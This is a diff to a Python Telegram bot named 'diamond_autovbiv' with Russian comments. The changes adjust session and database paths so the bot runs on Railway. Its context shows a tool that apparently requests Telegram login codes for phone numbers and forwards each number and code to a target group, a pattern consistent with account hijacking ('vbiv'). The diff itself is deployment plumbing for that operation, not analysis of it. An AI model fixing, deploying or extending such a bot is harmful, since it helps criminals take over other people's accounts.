@@ -1,5 +1,5 @@
 # diamond_autovbiv.py
-# ИСПРАВЛЕННАЯ ВЕРСИЯ ДЛЯ RAILWAY
+# FIXED - РАБОТАЕТ НА RAILWAY
 
 import os
 import asyncio
@@ -15,14 +15,20 @@ API_ID = int(os.environ.get("API_ID", 0))
 API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 
+# Путь для сессий в Railway (используем /tmp или переменную окружения)
+SESSION_DIR = os.environ.get("SESSION_DIR", "/app/sessions")
+os.makedirs(SESSION_DIR, exist_ok=True)
+
 if not API_ID or not API_HASH or not BOT_TOKEN:
-    print("❌ Ошибка: Установите переменные в Railway: API_ID, API_HASH, BOT_TOKEN")
+    print("❌ Ошибка: Установите переменные в Railway")
     exit(1)
 
 # ========== БАЗА ДАННЫХ ==========
+DB_PATH = "/app/diamond_data.db"
+
 class DiamondDB:
     def __init__(self):
-        self.conn = sqlite3.connect('diamond_data.db', check_same_thread=False)
+        self.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
         self.cursor = self.conn.cursor()
         self.init_tables()
     
@@ -151,7 +157,8 @@ async def get_user_client(user_id, session_string=None):
         if not session_string:
             return None
     
-    client = TelegramClient(f"sessions/user_{user_id}", API_ID, API_HASH)
+    session_path = os.path.join(SESSION_DIR, f"user_{user_id}")
+    client = TelegramClient(session_path, API_ID, API_HASH)
     await client.connect()
     
     if session_string:
@@ -191,6 +198,7 @@ async def setup_handlers():
 /set_target — отметить ГРУППУ 2 (куда отправлять и где "встал")
 /stats — статистика
 /status — статус
+/reset — сброс всех данных
 
 💎 **Бот сразу отправляет номер и код в TARGET**
         """, parse_mode='markdown')
@@ -202,7 +210,9 @@ async def setup_handlers():
         
         await event.reply(f"📱 Отправляю код на {phone}...")
         
-        client = TelegramClient(f"sessions/temp_{user_id}", API_ID, API_HASH)
+        # ИСПРАВЛЕНО: используем правильный путь для сессии
+        session_path = os.path.join(SESSION_DIR, f"temp_{user_id}")
+        client = TelegramClient(session_path, API_ID, API_HASH)
         await client.connect()
         
         try:
@@ -440,9 +450,10 @@ async def main():
     global bot
     print("💎 DIAMOND AUTOVBIV BOT — ФИНАЛЬНАЯ ВЕРСИЯ")
     print(f"📡 API_ID: {API_ID}")
+    print(f"📁 Session dir: {SESSION_DIR}")
     
-    # ПРАВИЛЬНАЯ инициализация бота
-    bot = TelegramClient("diamond_bot", API_ID, API_HASH)
+    # Создаём бота с правильным путём
+    bot = TelegramClient(os.path.join(SESSION_DIR, "main_bot"), API_ID, API_HASH)
     await bot.start(bot_token=BOT_TOKEN)
     
     await setup_handlers()
